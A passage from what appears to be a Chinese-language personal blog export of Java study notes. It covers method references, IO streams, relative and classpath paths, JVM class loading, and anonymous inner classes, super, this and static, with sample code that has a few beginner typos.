<h3 id="方法引用的总结"><a href="#方法引用的总结" class="headerlink" title="方法引用的总结"></a>方法引用的总结</h3><p>经过多方整合+个人理解琢磨，终于有一点小感悟了！</p>
<p><img src="https://i.loli.net/2021/11/29/PZO2C4UVWrSXGec.png" alt="img"></p>
<p>还是那句话，双冒号运算符，也叫方法引用，本质上就是字面上的意思：<strong>方法引用</strong>。</p>
<p>但是这里有一个过程（这个过程懂了就什么都懂了）：在使用方法引用的时候，就是将被引用的方法，重新还原成一个接口实现对象，这样就即可以直接被调用（对应前面三种的语法），又能用来实现接口中的唯一的抽象方法了（也就是类构造器的语法）。如此一来的话，就什么都说的通了</p>
<hr>
<h2 id="补充一个方法引用语法的用途"><a href="#补充一个方法引用语法的用途" class="headerlink" title="补充一个方法引用语法的用途"></a>补充一个方法引用语法的用途</h2><h3 id="数组引用"><a href="#数组引用" class="headerlink" title="数组引用"></a>数组引用</h3><p><strong>数组::new</strong></p>
<p>数组引用算是构造器引用的一种，可以引用一个数组的构造，举个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ImTheOne</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">T <span class="title">getArr</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ImTheOne&lt;<span class="keyword">int</span>[]&gt; imTheOne = <span class="keyword">int</span>[]::<span class="keyword">new</span>;</span><br><span class="line">        <span class="keyword">int</span>[] stringArr = imTheOne.getArr(<span class="number">5</span>);</span><br><span class="line">        System.out.println(stringArr.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理和上面讲的一样，可以花点时间看下，加深一下对方法引用的理解。</p>
]]></content>
      <tags>
        <tag>lambda表达式</tag>
        <tag>java8新特性</tag>
        <tag>::双冒号</tag>
        <tag>方法引用</tag>
      </tags>
  </entry>
  <entry>
    <title>java中的IO流使用</title>
    <url>/2021/09/07/java%E4%B8%AD%E7%9A%84IO%E6%B5%81%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="IO流体系"><a href="#IO流体系" class="headerlink" title="IO流体系"></a>IO流体系</h2><span id="more"></span>

<h3 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h3><p><img src="https://i.loli.net/2021/11/01/SegF6hJp2XWVUtK.jpg" alt="img"></p>
<h3 id="完整API体系"><a href="#完整API体系" class="headerlink" title="完整API体系"></a>完整API体系</h3><p>序列化时，还学习到了<strong>ByteArrayOutputStream流</strong> </p>
<p><strong>ByteArrayOutputStream 对byte类型数据进行写入的类 相当于一个中间缓冲层，将类写入到文件等其他outputStream。它是对字节进行操作，属于内存操作流</strong></p>
<p><img src="https://i.loli.net/2021/11/01/nRey7Ogr1PI8Hql.jpg" alt="img"></p>
<p><img src="https://i.loli.net/2021/11/01/OeoYDKUvqTIgyV4.jpg" alt="img"></p>
<h2 id="从控制台读取输入流（三种方法）"><a href="#从控制台读取输入流（三种方法）" class="headerlink" title="从控制台读取输入流（三种方法）"></a>从控制台读取输入流（三种方法）</h2><p><img src="https://i.loli.net/2021/11/01/4GPOydoXVN5cqiJ.jpg" alt="img"></p>
]]></content>
      <tags>
        <tag>IO流</tag>
      </tags>
  </entry>
  <entry>
    <title>java中的相对路径用法</title>
    <url>/2021/09/07/java%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h2 id="一、不借助类的直接相对路径（一般不用）"><a href="#一、不借助类的直接相对路径（一般不用）" class="headerlink" title="一、不借助类的直接相对路径（一般不用）"></a>一、不借助类的直接相对路径（一般不用）</h2><span id="more"></span>

<p>下面两行的效果一样</p>
<p><img src="https://i.loli.net/2021/09/17/28CkdVmxBhgWSMT.png" alt="image-20210917221912780"></p>
<p>上面一行就是相对于当前工程目录（此种方法一般不用，因为，发布的时候src目录就不存在了）</p>
<p>下面一行是绝对路径</p>
<h2 id="二、借助类的获取相对路径（看编译后的文件路径）"><a href="#二、借助类的获取相对路径（看编译后的文件路径）" class="headerlink" title="二、借助类的获取相对路径（看编译后的文件路径）"></a>二、借助类的获取相对路径（看编译后的文件路径）</h2><p>*<em>此时，不可以采用上面的src/*<em>路径,因为编译后src目录不存在</em></em></p>
<p><strong>使用斜杠</strong>表示项目的根目录</p>
<p>下面出现了两种使用方法：</p>
<ol>
<li>一种是使用<strong>“/”</strong>，<strong>推荐使用这种</strong></li>
<li>另一种是使用<strong>“./”</strong>，这种方法<strong>不推荐</strong>，（因为有时候这种方法会不允许）</li>
</ol>
<p><strong>下面两张图分别是允许使用“./”，和不允许使用”./“的情况，但是都允许使用”/“</strong></p>
<p><img src="https://i.loli.net/2021/09/17/KcFpARZe9qDJ3d7.png" alt="image-20210917220901850"></p>
<p><img src="https://i.loli.net/2021/09/17/Dluy2erTdZN1mpE.png" alt="image-20210917221601506"></p>
<h2 id="三、小结"><a href="#三、小结" class="headerlink" title="三、小结"></a>三、小结</h2><p>上述两种使用方法基本上可以满足平常使用需要</p>
<h3 id="留有问题"><a href="#留有问题" class="headerlink" title="留有问题"></a>留有问题</h3><p>但是，还会有一些其他情况，由于没有摸索清楚，所以没有写上去。比如有时候，第二种方法中的”/”也可以直接去掉，有时候却不行；有时候第二种方法中的“./”可以使用，“../”也可以使用，但有时候却不行。</p>
<h3 id="若有高手，敬请指教，等待帮忙更新Thanks♪-･ω･-ﾉ"><a href="#若有高手，敬请指教，等待帮忙更新Thanks♪-･ω･-ﾉ" class="headerlink" title="若有高手，敬请指教，等待帮忙更新Thanks♪(･ω･)ﾉ"></a>若有高手，敬请指教，等待帮忙更新Thanks♪(･ω･)ﾉ</h3><p><img src="https://i.loli.net/2021/09/17/K26cZI9sLu38lbP.jpg" alt="img"></p>
<hr>
<hr>
<hr>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>几周过去了，又遇到了相对路径的问题，回头重新看了博客，感觉之前的理解还不够好，又重新整理了一下。</p>
<p><strong>首先，将路径问题重新进行分类：①相对的是计算机的盘符根目录（如“D:”）②相对当前项目的根目录③相对classpath路径④Properties获取资源文件⑤绝对路径</strong></p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p><img src="https://i.loli.net/2021/11/23/5GlJzQ4WYLSAna8.png" alt="image-20211123124724761"></p>
<h3 id="相对的是计算机的盘符根目录（如“D-”）"><a href="#相对的是计算机的盘符根目录（如“D-”）" class="headerlink" title="相对的是计算机的盘符根目录（如“D:”）"></a>相对的是计算机的盘符根目录（如“D:”）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File file2 = <span class="keyword">new</span> File(<span class="string">&quot;/text&quot;</span>);</span><br><span class="line">System.out.println(file2.getAbsolutePath());</span><br><span class="line">File file4 = <span class="keyword">new</span> File(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">System.out.println(file4.getAbsolutePath());</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/23/tksg8QYRSzeUZBC.png" alt="image-20211123125347487"></p>
<p>上述代码读取的就是从D盘，可见<strong>“/”和“/内容“</strong>代表的是盘符根目录</p>
<h3 id="相对当前项目的根目录"><a href="#相对当前项目的根目录" class="headerlink" title="相对当前项目的根目录"></a>相对当前项目的根目录</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File file1 = <span class="keyword">new</span> File(<span class="string">&quot;./text&quot;</span>);</span><br><span class="line">System.out.println(file1.getAbsolutePath());</span><br><span class="line">File file4 = <span class="keyword">new</span> File(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">System.out.println(file4.getAbsolutePath());</span><br><span class="line">File file5 = <span class="keyword">new</span> File(<span class="string">&quot;&quot;</span>);</span><br><span class="line">System.out.println(file5.getAbsolutePath());</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/23/UPk4sTMH5Xpnr7y.png" alt="image-20211123125328298"></p>
<p>上述代码读取的位置是相对<strong>项目的根目录位置</strong></p>
<h3 id="相对classpath路径"><a href="#相对classpath路径" class="headerlink" title="相对classpath路径"></a>相对classpath路径</h3><h4 id="什么是classpath路径？"><a href="#什么是classpath路径？" class="headerlink" title="什么是classpath路径？"></a>什么是classpath路径？</h4><p>什么是classpath路径？或者说classpath路径指向的是哪里呢？</p>
<p>回答：最终下图中的<strong>src源文件夹、resource资源文件夹****中的内容都会被打包到输出文件夹</strong>tearget/classes文件夹下（java和resource就不在了）**</p>
<p><img src="https://i.loli.net/2021/11/23/yITupBcF2NOhgfU.png" alt="image-20211123124938384"></p>
<h4 id="有哪些获取classpath路径的方法呢？"><a href="#有哪些获取classpath路径的方法呢？" class="headerlink" title="有哪些获取classpath路径的方法呢？"></a>有哪些获取classpath路径的方法呢？</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(file3.getAbsolutePath());</span><br><span class="line">System.out.println(Test2.class.getResource(<span class="string">&quot;&quot;</span>));</span><br><span class="line">System.out.println(Test2.class.getResource(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">System.out.println(Test2.class.getClassLoader().getResource(<span class="string">&quot;&quot;</span>));</span><br><span class="line">System.out.println(ClassLoader.getSystemResource(<span class="string">&quot;&quot;</span>));</span><br><span class="line">System.out.println(Thread.currentThread().getContextClassLoader().getResource(<span class="string">&quot;&quot;</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/23/mUNbspIXjnLdkQM.png" alt="image-20211123125500979"></p>
<h3 id="使用Properties获取资源文件"><a href="#使用Properties获取资源文件" class="headerlink" title="使用Properties获取资源文件"></a>使用Properties获取资源文件</h3><p>使用下面代码可以获取到<strong>resource资源文件下的资源文件</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">properties.getProperty(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>绝对路径就一句话：从盘赋开始的URL路径</p>
<h2 id="第二次小结"><a href="#第二次小结" class="headerlink" title="第二次小结"></a>第二次小结</h2><p>经过两次的大学习、大整理，关于java的相对路径总的来说就三个方面（或者说是三个类型）：</p>
<ul>
<li><p>相对jdk所在盘符根目录</p>
</li>
<li><p>相对项目所在的根目录</p>
</li>
<li><p>相对classpath所在的路径（需要理解classpath路径指向的是哪里）</p>
</li>
<li><p>附加一个Properties获取资源文件的类</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>java相对路径</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存分析（1）——类加载的内存分析</title>
    <url>/2021/08/19/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%881%EF%BC%89%E2%80%94%E2%80%94%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="java文件如何被运行"><a href="#java文件如何被运行" class="headerlink" title="java文件如何被运行"></a>java文件如何被运行</h2><span id="more"></span>

<p>先通过编译，将.java文件编译成.class文件，然后让类加载器加载到方法区中去</p>
<p><img src="https://i.loli.net/2021/08/19/9RlL2opHSE6uIQV.png" alt="image-20210819111135267"></p>
<h2 id="类加载的内存分析"><a href="#类加载的内存分析" class="headerlink" title="类加载的内存分析"></a>类加载的内存分析</h2><h3 id="JVM内存结构"><a href="#JVM内存结构" class="headerlink" title="JVM内存结构"></a>JVM内存结构</h3><p><strong>方法区：</strong></p>
<ul>
<li>用于存放类似于元数据信息方面的，比如类信息，<strong>常量</strong>，<strong>静态变量</strong>，编译后代码……</li>
<li>类加载器将**.class文件**搬过来就是先丢到这一块上</li>
</ul>
<p><strong>堆：</strong></p>
<ul>
<li>主要存放了一些存储的数据，比如<strong>对象实例（包括class对象实例）</strong>，<strong>数组</strong>等</li>
<li>它和方法区都属于<strong>线程共享区域</strong>，也就是说它们的线程不安全</li>
</ul>
<p><strong>栈：</strong></p>
<ul>
<li>这是我们的代码运行空间。我们编写的<strong>每一个方法</strong>都会放到栈里面运行</li>
<li>线程独享</li>
</ul>
<h2 id="类加载器的流程"><a href="#类加载器的流程" class="headerlink" title="类加载器的流程"></a>类加载器的流程</h2><p><strong>加载</strong>：</p>
<ol>
<li>将.class文件加载到内存</li>
<li>将静态数据结构转换为<strong>方法区中</strong>运行时的数据结构</li>
<li>在堆中生成一个代表这个类的java.lang.Class对象作为数据访问的入口</li>
</ol>
<p><strong>链接</strong>：</p>
<ol>
<li>验证：确保加载的类符合JVM规范和安全，保证被校验类的方法在运行时不会做出危害虚拟机的事件，其实是一个安全检查</li>
<li>准备：为<strong>static变量</strong>在<strong>方法区</strong>中分配内存空间，设置变量的初始值</li>
<li>解析：虚拟机将常量吃内的符号引用替换为直接引用的过程</li>
</ol>
<p><strong>初始化</strong>：</p>
<ol>
<li>执行类构造器<clinit>()方法。类构造器方法是由编译期自动收集类中所有的类变量的赋值动作和静态代码块中的语句合并产生的。</li>
</ol>
<h2 id="分析类的初始化"><a href="#分析类的初始化" class="headerlink" title="分析类的初始化"></a>分析类的初始化</h2><h3 id="什么时候会发生类初始化？"><a href="#什么时候会发生类初始化？" class="headerlink" title="什么时候会发生类初始化？"></a>什么时候会发生类初始化？</h3><ol>
<li><strong>类的主动引用（一定会发生类的初始化）</strong><ul>
<li>当虚拟机启动，先初始化main方法所在的类</li>
<li>new一个类的对象</li>
<li>调用类的静态成员（除了final常量）和静态方法</li>
<li>使用java.lang.reflect包的方法对类进行反射调用</li>
<li>当初始化一个类，如果其父类没有被初始化，则会先初始化他的父类</li>
</ul>
</li>
<li><strong>类的被动引用（不会发生类的初始化）</strong><ul>
<li>当访问一个静态域时，只有真正声明这个域的类才会被初始化。如当通过子类引用父类的静态变量，不会导至子类初始化</li>
<li>通过数组定义类引用，不会触发此类的初始化</li>
<li>引用常量不会出发此类的初始化（常量在链接阶段就存入调用类的常量池中了）</li>
</ul>
</li>
</ol>
<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><h3 id="类加载的作用："><a href="#类加载的作用：" class="headerlink" title="类加载的作用："></a>类加载的作用：</h3><p>将class文件字节码内容<strong>加载到内存中</strong>，并将这些静态数据转换成方法区的运行时数据结构，然后<strong>在堆中生成一个代表这个类的java.lang.Class对象，作为方法区中类数据的访问入口（注意：入口在堆中）</strong></p>
<h3 id="类加载器的加载顺序"><a href="#类加载器的加载顺序" class="headerlink" title="类加载器的加载顺序"></a>类加载器的加载顺序</h3><p>加载一个Class类的顺序也是有优先级的，类加载器从最底层开始往上的顺序是这样的</p>
<p><img src="https://i.loli.net/2021/08/19/eto8ap2DY1nkAJj.png" alt="这里写图片描述"></p>
<ol>
<li><p>BootstrapClassLoader（启动类加载器） </p>
<p>负责加载<code>$JAVA_HOME中jre/lib/rt.jar</code>里所有的class，加载System.getProperty(“sun.boot.class.path”)所指定的路径或jar</p>
</li>
<li><p>ExtensionClassLoader（标准扩展类加载器） </p>
<p>负责加载java平台中扩展功能的一些jar包，包括$JAVA_HOME中jre/lib/*.jar或-Djava.ext.dirs指定目录下的jar包。载System.getProperty(“java.ext.dirs”)所指定的路径或jar。 </p>
</li>
<li><p>AppClassLoader（系统类加载器） </p>
<p>负责记载classpath中指定的jar包及目录中class </p>
</li>
<li><p>CustomClassLoader（自定义加载器） </p>
<p>属于应用程序根据自身需要自定义的ClassLoader，如tomcat、jboss都会根据j2ee规范自行实现。</p>
</li>
</ol>
<h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>当一个类收到了加载请求时，它是不会先自己去尝试加载的，而是委派给父类去完成。</p>
<p>只有当父类加载器范阔自己无法完成这个请求（也就是父类加载器都没找到加载所需的Class）时，子类加载器才会自行尝试加载</p>
<p>好处：加载位于rt.jar包中的类时不管是那个加载器加载，最终都会委托到BootStrap ClassLoader进行加载，这样保证了使用不同的类加载器得到的都是同一个结果。</p>
<p>其实这是一个隔离的作用，避免了我们的代码影响了JDK的代码。</p>
<h3 id="类缓存"><a href="#类缓存" class="headerlink" title="类缓存"></a>类缓存</h3><p>某一个类被类加载器加载到内存中，维持加载（缓存）一段时间。不过JVM垃圾回收机制可以回收这些Class对象</p>
<blockquote>
<p>​    <a href="https://www.cnblogs.com/max-home/p/12270183.html">参考文章：大白话带你认识JVM(转) - 壹袋米 - 博客园 (cnblogs.com)</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>JVM内存分析</tag>
        <tag>类的加载器</tag>
        <tag>类的初始化过程</tag>
        <tag>双亲委派机制</tag>
      </tags>
  </entry>
  <entry>
    <title>java中经常忘记的几个知识点</title>
    <url>/2021/08/19/java%E4%B8%AD%E7%BB%8F%E5%B8%B8%E5%BF%98%E8%AE%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<h2 id="忘记点1：匿名内部类的使用"><a href="#忘记点1：匿名内部类的使用" class="headerlink" title="忘记点1：匿名内部类的使用"></a>忘记点1：匿名内部类的使用</h2><span id="more"></span>

<h3 id="使用情境"><a href="#使用情境" class="headerlink" title="使用情境"></a>使用情境</h3><p>通常在<strong>实现接口</strong>、<strong>继承抽象父类</strong>的时候需要使用到匿名内部类</p>
<h4 id="实现接口："><a href="#实现接口：" class="headerlink" title="实现接口："></a>实现接口：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Product</span></span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">double</span> <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Anony</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(Product product)</span></span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;购买了一个&quot;</span>+product.getName()+<span class="string">&quot;，花掉了&quot;</span>+product.getPrice());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pubic <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">		Anony anony=<span class="keyword">new</span> anony();</span><br><span class="line">		<span class="comment">// 注意，此处要传入一个匿名类对象</span></span><br><span class="line">		anony.test(<span class="keyword">new</span> Product()&#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span></span>&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">578.6</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="string">&quot;联想笔记本&quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>调用了Anony的test方法，并为其传入一个新new的Product实例作为参数</p>
</blockquote>
<p>打印结果：</p>
<p><img src="https://i.loli.net/2021/08/19/Lk1PwGce7rtjJub.png" alt="image-20210819141211652"></p>
<h4 id="继承抽象父类"><a href="#继承抽象父类" class="headerlink" title="继承抽象父类"></a>继承抽象父类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Device</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">double</span>  <span class="title">getPrice</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">	 	<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Device</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Device</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name=name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Device</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(Device device)</span></span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;购买了一个&quot;</span>+device.getName()+<span class="string">&quot;花费了&quot;</span>+device.getPrice());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pubic <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">		Anony anony=<span class="keyword">new</span> anony();</span><br><span class="line">		<span class="comment">// 注意，此处要传入一个匿名类对象</span></span><br><span class="line">		anony.test(<span class="keyword">new</span> Device(<span class="string">&quot;海尔电视机&quot;</span>)&#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span></span>&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">578.6</span>;</span><br><span class="line">				&#125;</span><br><span class="line">		);</span><br><span class="line">		Device device=<span class="keyword">new</span> Device()&#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span></span>&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">556.56</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&quot;美的电视机&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">		annoy.test(device);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>调用、传参过程与上一个相似</p>
</blockquote>
<p>打印结果：</p>
<p><img src="https://i.loli.net/2021/08/19/oxgmH6hVTzdWLAy.png" alt="image-20210819141434202"></p>
<h2 id="忘记点2：super关键字的使用"><a href="#忘记点2：super关键字的使用" class="headerlink" title="忘记点2：super关键字的使用"></a>忘记点2：super关键字的使用</h2><p><strong>super指向当前对象的父类特征</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//父类，Animal类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Animal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Animal类的无参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类，Cat类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Cat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Cat类的无参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行下面代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cat c1 = <span class="keyword">new</span> Cat(); </span><br></pre></td></tr></table></figure>

<p>打印结果：</p>
<p><img src="https://i.loli.net/2021/08/19/APEmo52ZcrhHGI1.png" alt="image-20210819141724393"></p>
<p><strong>默认会</strong>在构造方法中的<strong>第一行隐式地</strong>添加一个父类的无参构造函数（也可以手动添加其他构造函数，如下图）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">new</span> Cat(); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//父类，Animal类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Animal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		System.out.println(<span class="string">&quot;1：Animal类的无参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Animal</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		System.out.println(<span class="string">&quot;2：Animal类的有int参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类，Cat类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Cat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">		System.out.println(<span class="string">&quot;3：Cat类的无参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Cat</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(<span class="number">5</span>);</span><br><span class="line">		System.out.println(<span class="string">&quot;4：Cat类的有String参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="忘记点3：this关键的使用"><a href="#忘记点3：this关键的使用" class="headerlink" title="忘记点3：this关键的使用"></a>忘记点3：this关键的使用</h2><p><strong>this指向当前对象自己，super指向当前对象的父类型特征，故this的东西比super多，也就是super是this的一部分；</strong></p>
<h2 id="忘记点4：static的作用"><a href="#忘记点4：static的作用" class="headerlink" title="忘记点4：static的作用"></a>忘记点4：static的作用</h2><p><strong>从可见性来看：</strong>有static修饰的时候，对外是可见的；否则，对外不可见，必须有一个外部类（或者对象）的引用才可使用</p>
<p><strong>从内存分析来看：</strong>static修饰的变量，存储在<strong>方法区静态域</strong>中，<strong>被所有线程共享</strong>(<strong>方法区包含所有的class和static变量</strong>)</p>
<h3 id="案例：静态和非静态内部类"><a href="#案例：静态和非静态内部类" class="headerlink" title="案例：静态和非静态内部类"></a>案例：静态和非静态内部类</h3><p><strong>两种的创建对象方式不同</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.定义一个函数式接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestLambda</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 3.非静态内部类（对外不直接可见，必须有一个外部类的引用才能被创建）</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Like2</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我喜欢lambda2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 